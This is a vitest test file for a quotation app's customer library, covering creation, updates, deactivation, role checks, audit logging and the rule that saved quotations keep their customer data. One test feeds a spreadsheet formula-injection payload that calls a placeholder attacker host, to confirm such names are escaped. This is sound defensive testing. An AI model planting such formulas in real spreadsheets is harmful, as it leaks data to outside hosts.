/**
 * Customer library.
 *
 * Driven through `handlePost`, never the handlers directly: the authorization
 * lives in the ACTIONS table and is applied by the router, so calling
 * `deactivate()` straight would prove nothing about whether a User can reach it.
 *
 * The section that matters most is the last one. A customer edit must not be
 * able to change a quotation that already exists, and that is asserted against
 * a real saved quotation rather than by reading the code.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { installGasFakes, type GasEnvironment } from '../__fixtures__/gas-fakes';
import { AUDIT_SHEET_NAME } from '../audit/audit-log';
import { createPasswordRecord } from '../auth/password';
import { handlePost } from '../main';
import { CLIENTS_SHEET_NAME } from '../sheets/clients-sheet';
import { TEST_ONLY_resetBootstrapState } from '../sheets/sheet-bootstrap';
import { createPerson, setSignatureFileId } from '../sheets/persons-sheet';
import { createUser } from '../sheets/users-repository';

const PEPPER = 'test-only-pepper-not-a-real-key';
const ADMIN_SECRET = 'TEST_ONLY_admin-horse-battery';
const USER_SECRET = 'TEST_ONLY_correct-horse-battery';

const ADMIN = 'admin@speedxksa.com';
const STAFF = 'staff@speedxksa.com';

interface Envelope {
  ok: boolean;
  data?: unknown;
  error?: { code: string; message: string; fields?: Record<string, string> };
}

interface PublicClient {
  id: string;
  clientName: string;
  companyName: string;
  address: string;
  contactPerson: string;
  email: string;
  phone: string;
  active: boolean;
}

let env: GasEnvironment;
let adminToken: string;
let userToken: string;
let signatoryId: string;

function call(action: string, payload: unknown = {}, token?: string): Envelope {
  const output = handlePost(
    JSON.stringify({
      action,
      requestId: 'test-request',
      payload,
      ...(token === undefined ? {} : { token }),
    }),
  ) as unknown as { getContent: () => string };

  return JSON.parse(output.getContent()) as Envelope;
}

function seedUser(email: string, secret: string, role: 'Admin' | 'User'): void {
  const material = createPasswordRecord(secret, PEPPER, 1_000);
  createUser({
    email,
    passwordHash: material.hash,
    salt: material.salt,
    iterations: material.iterations,
    role,
  });
}

function login(email: string, secret: string): string {
  const response = call('auth.login', { email, password: secret });
  return (response.data as { token: string }).token;
}

const VALID = {
  clientName: 'TEST_ONLY Contact',
  companyName: 'TEST_ONLY Client Co.',
  address: 'TEST_ONLY Address, Riyadh',
  contactPerson: 'TEST_ONLY Person',
  email: 'test-only.client@example.invalid',
  phone: '+966 50 000 0000',
};

function createCustomer(overrides: Record<string, unknown> = {}, token = userToken): PublicClient {
  const response = call('clients.create', { ...VALID, ...overrides }, token);
  expect(response.ok, JSON.stringify(response.error)).toBe(true);
  return response.data as PublicClient;
}

function listCustomers(includeInactive = false, token = userToken): PublicClient[] {
  const response = call('clients.list', { includeInactive }, token);
  expect(response.ok).toBe(true);
  return response.data as PublicClient[];
}

function auditRows(): unknown[][] {
  return env.spreadsheet.dataRows(AUDIT_SHEET_NAME);
}

beforeEach(() => {
  env = installGasFakes(vi.stubGlobal);
  TEST_ONLY_resetBootstrapState();

  const person = createPerson({
    id: 'TEST_ONLY-person-1',
    name: 'TEST_ONLY_Signatory',
    designation: 'TEST_ONLY Designation',
    companyName: 'TEST_ONLY Company',
    country: 'TEST_ONLY Country',
    email: 'test-only.signatory@example.invalid',
    phone: '+966 50 000 0000',
  });
  setSignatureFileId(person, 'TEST_ONLY-signature-file');
  signatoryId = person.id;

  seedUser(ADMIN, ADMIN_SECRET, 'Admin');
  seedUser(STAFF, USER_SECRET, 'User');
  adminToken = login(ADMIN, ADMIN_SECRET);
  userToken = login(STAFF, USER_SECRET);
});

afterEach(() => {
  vi.unstubAllGlobals();
});

/* -------------------------------------------------------------------------- */
/* The sheet ships empty                                                      */
/* -------------------------------------------------------------------------- */

describe('the library ships empty', () => {
  it('has no customers before anyone creates one (PRD §34)', () => {
    expect(listCustomers(true)).toEqual([]);
  });
});

/* -------------------------------------------------------------------------- */
/* CRUD                                                                       */
/* -------------------------------------------------------------------------- */

describe('creating', () => {
  it('creates a customer with a server-generated id', () => {
    const created = createCustomer();

    expect(created.id.length).toBeGreaterThan(0);
    expect(created.active).toBe(true);
    expect(created).toMatchObject(VALID);
  });

  it('ignores any id the client tries to supply', () => {
    const created = createCustomer({ id: 'client-chosen-id' });

    expect(created.id).not.toBe('client-chosen-id');
  });

  it('rejects a missing required field', () => {
    const response = call('clients.create', { ...VALID, clientName: '' }, userToken);

    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(response.error?.fields?.['clientName']).toBeDefined();
    expect(listCustomers(true)).toHaveLength(0);
  });

  it('rejects a malformed email and phone', () => {
    expect(
      call('clients.create', { ...VALID, email: 'not-an-email' }, userToken).error?.fields?.['email'],
    ).toBeDefined();
    expect(
      call('clients.create', { ...VALID, phone: 'abc' }, userToken).error?.fields?.['phone'],
    ).toBeDefined();
  });

  it('accepts a customer with the optional fields left blank', () => {
    const created = createCustomer({ contactPerson: '', email: '', phone: '' });

    expect(created.email).toBe('');
  });

  it('rejects the same client-and-company pair twice', () => {
    createCustomer();
    const response = call('clients.create', VALID, userToken);

    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(listCustomers(true)).toHaveLength(1);
  });

  it('allows the same company with a different contact', () => {
    createCustomer();
    const second = createCustomer({ clientName: 'TEST_ONLY Second Contact' });

    // One company legitimately has several people to quote to.
    expect(second.companyName).toBe(VALID.companyName);
    expect(listCustomers(true)).toHaveLength(2);
  });
});

describe('updating', () => {
  it('changes the stored values', () => {
    const created = createCustomer();
    const response = call(
      'clients.update',
      { ...VALID, id: created.id, address: 'TEST_ONLY New Address, Jubail' },
      userToken,
    );

    expect(response.ok).toBe(true);
    expect((response.data as PublicClient).address).toBe('TEST_ONLY New Address, Jubail');
    expect(listCustomers()[0]?.address).toBe('TEST_ONLY New Address, Jubail');
  });

  it('refuses a customer that does not exist', () => {
    expect(
      call('clients.update', { ...VALID, id: 'no-such-id' }, userToken).error?.code,
    ).toBe('VALIDATION_FAILED');
  });

  it('lets a customer keep its own name', () => {
    const created = createCustomer();

    // The duplicate check must exclude the record being edited, or nothing
    // could ever be edited without renaming it first.
    expect(call('clients.update', { ...VALID, id: created.id }, userToken).ok).toBe(true);
  });
});

describe('deactivation', () => {
  it('hides the customer from the default list but keeps the row', () => {
    const created = createCustomer();
    expect(call('clients.deactivate', { id: created.id, active: false }, adminToken).ok).toBe(true);

    expect(listCustomers()).toHaveLength(0);
    expect(listCustomers(true)).toHaveLength(1);
  });

  it('never deletes the row', () => {
    const created = createCustomer();
    call('clients.deactivate', { id: created.id, active: false }, adminToken);

    const rows = env.spreadsheet.dataRows(CLIENTS_SHEET_NAME);
    expect(rows).toHaveLength(1);
    expect(String(rows[0]?.[0])).toBe(created.id);
  });

  it('reactivates', () => {
    const created = createCustomer();
    call('clients.deactivate', { id: created.id, active: false }, adminToken);
    call('clients.deactivate', { id: created.id, active: true }, adminToken);

    expect(listCustomers()).toHaveLength(1);
  });
});

/* -------------------------------------------------------------------------- */
/* Authorization                                                              */
/* -------------------------------------------------------------------------- */

describe('authorization', () => {
  it('lets a User read and write the library', () => {
    const created = createCustomer({}, userToken);

    expect(call('clients.list', {}, userToken).ok).toBe(true);
    expect(call('clients.update', { ...VALID, id: created.id }, userToken).ok).toBe(true);
  });

  it('refuses deactivation to a User', () => {
    const created = createCustomer();

    expect(call('clients.deactivate', { id: created.id, active: false }, userToken).error?.code).toBe(
      'FORBIDDEN',
    );
    expect(listCustomers()).toHaveLength(1);
  });

  it('refuses every client action with no token', () => {
    for (const action of ['clients.list', 'clients.create', 'clients.update', 'clients.deactivate']) {
      expect(call(action, VALID).error?.code, action).toBe('AUTH_REQUIRED');
    }
  });
});

/* -------------------------------------------------------------------------- */
/* Formula injection and audit                                                */
/* -------------------------------------------------------------------------- */

describe('a customer name cannot become a formula', () => {
  it('stores a leading-equals name as inert text', () => {
    const attack = '=IMPORTXML("https://attacker.example/log","//x")';
    const created = createCustomer({ clientName: attack });

    const raw = String(env.spreadsheet.dataRows(CLIENTS_SHEET_NAME)[0]?.[1]);

    // Escaped on the way in, and read back unchanged on the way out.
    expect(raw.charAt(0)).toBe("'");
    expect(created.clientName).toBe(attack);
    expect(listCustomers()[0]?.clientName).toBe(attack);
  });

  it('escapes the other formula-leading characters too', () => {
    for (const prefix of ['+', '-', '@']) {
      const created = createCustomer({ clientName: `${prefix}TEST_ONLY ${prefix}` });
      const row = env.spreadsheet
        .dataRows(CLIENTS_SHEET_NAME)
        .find((candidate) => String(candidate[0]) === created.id);

      expect(String(row?.[1]).charAt(0)).toBe("'");
    }
  });
});

describe('audit', () => {
  it('records every write', () => {
    const created = createCustomer();
    call('clients.update', { ...VALID, id: created.id }, userToken);
    call('clients.deactivate', { id: created.id, active: false }, adminToken);

    const actions = auditRows().map((row) => String(row[2]));
    expect(actions).toContain('clients.create');
    expect(actions).toContain('clients.update');
    expect(actions).toContain('clients.deactivate');
  });

  it('records the id and the resulting state, never the whole record', () => {
    const created = createCustomer();
    call('clients.deactivate', { id: created.id, active: false }, adminToken);

    const targets = auditRows().map((row) => String(row[3]));
    expect(targets).toContain(`${created.id} inactive`);

    // The client's address and contact details are not copied into the log.
    for (const row of auditRows()) {
      for (const value of row) {
        if (typeof value !== 'string') continue;
        expect(value).not.toContain(VALID.address);
        expect(value).not.toContain(VALID.email);
      }
    }
  });

  it('does not audit a read', () => {
    const before = auditRows().length;
    call('clients.list', {}, userToken);

    expect(auditRows().length).toBe(before);
  });
});

/* -------------------------------------------------------------------------- */
/* THE SNAPSHOT GUARANTEE                                                     */
/* -------------------------------------------------------------------------- */

describe('an existing quotation never changes when its customer does', () => {
  function quotationPayload(client: Record<string, string>): Record<string, unknown> {
    return {
      draftId: 'draft-customer-snapshot',
      quotationDate: '2026-08-11',
      quotationFor: 'TEST_ONLY manpower supply',
      pricingMode: 'amount',
      client,
      lines: [
        {
          id: 'line-1',
          category: 'Manpower',
          description: 'TEST_ONLY Technician',
          quantity: 1_000,
          unit: 'Nos',
          unitPrice: 100_00,
        },
      ],
      terms: [],
      closingParagraph: 'TEST_ONLY closing paragraph for the snapshot test.',
      authorizedPerson: { id: signatoryId },
      discountRateBasisPoints: 0,
      vatRateBasisPoints: 1500,
    };
  }

  function storedClient(): Record<string, unknown> {
    const response = call('quotation.get', { draftId: 'draft-customer-snapshot' }, userToken);
    expect(response.ok, JSON.stringify(response.error)).toBe(true);
    const quotation = (response.data as { quotation: Record<string, unknown> }).quotation;
    return quotation['client'] as Record<string, unknown>;
  }

  it('keeps the values the quotation was saved with after the customer is edited', () => {
    const customer = createCustomer();

    // Save a quotation using exactly what the picker would have copied in.
    const saved = call(
      'quotation.save',
      {
        quotation: quotationPayload({
          clientName: customer.clientName,
          companyName: customer.companyName,
          address: customer.address,
          contactPerson: customer.contactPerson,
          email: customer.email,
          phone: customer.phone,
        }),
        finalize: false,
      },
      userToken,
    );
    expect(saved.ok, JSON.stringify(saved.error)).toBe(true);

    // Now change the customer completely.
    call(
      'clients.update',
      {
        id: customer.id,
        clientName: 'TEST_ONLY Renamed Contact',
        companyName: 'TEST_ONLY Renamed Co.',
        address: 'TEST_ONLY Somewhere Else Entirely',
        contactPerson: 'TEST_ONLY Someone Else',
        email: 'test-only.different@example.invalid',
        phone: '+966 50 111 1111',
      },
      userToken,
    );

    // The quotation is untouched.
    expect(storedClient()).toMatchObject({
      clientName: VALID.clientName,
      companyName: VALID.companyName,
      address: VALID.address,
    });
  });

  it('keeps them after the customer is deactivated', () => {
    const customer = createCustomer();
    call(
      'quotation.save',
      {
        quotation: quotationPayload({
          clientName: customer.clientName,
          companyName: customer.companyName,
          address: customer.address,
        }),
        finalize: false,
      },
      userToken,
    );

    call('clients.deactivate', { id: customer.id, active: false }, adminToken);

    expect(storedClient()).toMatchObject({ companyName: VALID.companyName });
  });

  it('stores no customer id on the quotation, so there is no link to follow', () => {
    const customer = createCustomer();
    call(
      'quotation.save',
      {
        quotation: quotationPayload({
          clientName: customer.clientName,
          companyName: customer.companyName,
          address: customer.address,
        }),
        finalize: false,
      },
      userToken,
    );

    const client = storedClient();
    expect(client['id']).toBeUndefined();
    expect(client['customerId']).toBeUndefined();
    expect(client['clientId']).toBeUndefined();
    expect(JSON.stringify(client)).not.toContain(customer.id);
  });
});
